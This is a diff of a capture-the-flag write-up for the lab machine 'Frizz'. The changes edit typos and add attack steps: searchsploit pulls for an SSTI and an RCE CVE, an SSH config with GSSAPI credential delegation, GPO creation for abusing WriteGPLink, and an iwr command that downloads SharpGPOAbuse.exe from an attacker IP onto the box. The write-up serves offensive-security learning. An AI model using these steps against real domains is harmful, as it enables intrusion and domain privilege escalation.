@@ -149,7 +149,7 @@ searchsploit -m php/webapp/51903.py
 searchsploit -m php/webapp/51962.txt
 ```
 
-The RCE is Authenticated and we don't have an account yet, so I'm looking at the SSTI first, the both seem to be related as they have been found by the same ppland their CVE numbers are back to back
+The RCE is authenticated and we don't have an account yet, so I'm looking at the SSTI first, the both seem to be related as they have been found by the same ppl and their CVE numbers are back to back
 - ssti = [CVE-2024-24724](https://packetstorm.news/files/id/177857)
 -  rce = [CVE-2024-24725](https://packetstorm.news/files/id/177635/)
 
@@ -588,6 +588,15 @@ sudo vim /etc/krb5.conf
     frizz.htb = FRIZZ.HTB
 ```
 ```bash
+cat ~/.ssh/config
+```
+```
+KexAlgorithms diffie-hellman-group18-sha512,ecdh-sha2-nistp521
+Host *
+    GSSAPIAuthentication yes
+    GSSAPIDelegateCredentials yes
+```
+```bash
 ssh -v f.frizzle@FRIZZ.HTB
 ```
 
@@ -735,7 +744,7 @@ Get-DomainObjectAcl -Identity "Default Domain Controllers Policy" -ResolveGUIDs 
 
 ## Successfully abuse WriteGPLink
 
-Create a new GPO
+Create a new GPO with built in powershell commands
 ```powershell
 New-GPO -Name "blnkn"
 ```
@@ -764,6 +773,11 @@ Enabled     : True
 Enforced    : False
 Target      : OU=Domain Controllers,DC=frizz,DC=htb
 Order       : 2
+```
+
+Get SharpGPOAbuse.exe on the box
+```powershell
+iwr "http://10.10.16.71:9090/SharpGPOAbuse.exe" -OutFile ./SharpGPOAbuse.exe
 ```
 
 Add m.schoolbus to localadmin group
